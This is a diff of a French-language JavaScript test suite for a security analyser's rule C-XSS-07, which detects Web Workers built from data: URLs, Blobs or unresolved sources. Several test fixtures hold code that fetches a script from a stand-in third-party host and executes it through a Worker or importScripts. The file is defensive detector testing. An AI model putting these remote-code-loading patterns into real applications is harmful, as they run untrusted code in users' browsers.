@@ -377,16 +377,29 @@ test('C-XSS-07 : new Worker(url data: littérale) est critique et bloquant', () 
   assert.equal(c.bloquant, true);
 });
 
-test('C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau) ne déclenche rien — déjà couvert par C-EXFIL-01/02 au moment de la requête', () => {
+test("C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau, ou autre) est signalé quand même — accuser la construction, pas le contenu (la coordination a montré que 'seulement si littéral' se contournait en une ligne)", () => {
   const ctx = { fichiers: [fichier('app.js', [
     "const texte = await (await fetch('https://exemple.tiers/lib.js')).text();",
     'const w = new Worker(URL.createObjectURL(new Blob([texte])));',
   ].join('\n'))] };
-  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0, "aucun littéral dans le tableau du Blob : le contenu vient d'ailleurs (déjà vu par C-EXFIL-01/02 sur le fetch)");
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c, "récupérer un contenu (déjà vu par C-EXFIL-01/02 sur le fetch) et l'exécuter comme du code sont deux faits distincts, pas un double comptage du même fait");
+  assert.equal(c.severite, 'critique');
+  assert.equal(c.bloquant, true);
 });
 
-test("C-XSS-07 : new Worker('./local.js') normal (chemin de fichier, pas data:) ne déclenche rien", () => {
+test("C-XSS-07 : new Worker('./local.js') normal (chemin de fichier, pas data:/Blob) ne déclenche rien", () => {
   const ctx = { fichiers: [fichier('app.js', "const w = new Worker('./local.js');")] };
+  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
+});
+
+test("C-XSS-07 : new Worker(url http(s) absolue littérale) ne déclenche rien (code cassé, jamais exécuté — voir be1b5f4)", () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new Worker('https://exemple.tiers/worker.js');")] };
+  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
+});
+
+test("C-XSS-07 : new Worker(new URL('./local.js', import.meta.url)) (forme des empaqueteurs) ne déclenche toujours rien (pas de régression)", () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('./local.js', import.meta.url));")] };
   assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
 });
 
@@ -394,4 +407,39 @@ test('C-XSS-07 : un gabarit statique dans le tableau du Blob compte aussi comme 
   const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(URL.createObjectURL(new Blob([`postMessage(1);`])));')] };
   const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
   assert.ok(c);
+});
+
+test("C-XSS-07 : une URL data: obtenue par CONCATÉNATION ('data:text/javascript,' + code) est aussi critique et bloquante", () => {
+  const ctx = { fichiers: [fichier('app.js', "const code = \"importScripts('https://exemple.tiers/x.js')\"; const w = new Worker('data:text/javascript,' + code);")] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c, "la tête littérale 'data:text/javascript,' suffit à reconnaître le motif, même si le reste est une variable");
+  assert.equal(c.severite, 'critique');
+  assert.equal(c.bloquant, true);
+});
+
+test("C-XSS-07 : une source non résolue (variable simple, gabarit interpolé) produit un constat majeur, à vérifier — plutôt que le silence d'avant", () => {
+  const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(sourceCalculeeAilleurs);')] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c, "une variable peut cacher une URL blob: assemblée dans une instruction précédente, invisible à l'analyse d'une seule expression");
+  assert.equal(c.severite, 'majeur');
+  assert.equal(c.bloquant, false);
+  assert.equal(c.confiance, 'a_verifier');
+});
+
+test('C-XSS-07 : un gabarit AVEC interpolation comme source de Worker est aussi traité comme non résolu (pas de silence, pas de plantage)', () => {
+  const ctx = { fichiers: [fichier('app.js', 'const nom = "w"; const w = new Worker(`./${nom}.js`);')] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c);
+  assert.equal(c.severite, 'majeur');
+});
+
+test("C-XSS-07 : new Worker(url) où url = URL.createObjectURL(blob) est assigné dans une instruction PRÉCÉDENTE reste, honnêtement, 'non résolue' (pas de suivi inter-instructions) — mais n'est plus silencieux", () => {
+  const ctx = { fichiers: [fichier('app.js', [
+    "const blob = new Blob([\"importScripts('https://exemple.tiers/x.js')\"]);",
+    'const url = URL.createObjectURL(blob);',
+    'const w = new Worker(url);',
+  ].join('\n'))] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c, "l'analyse ne remonte pas au-delà de l'expression donnée à new Worker() : c'est le cas honnêtement documenté comme 'non résolue', pas un constat 'certain'");
+  assert.equal(c.severite, 'majeur');
 });
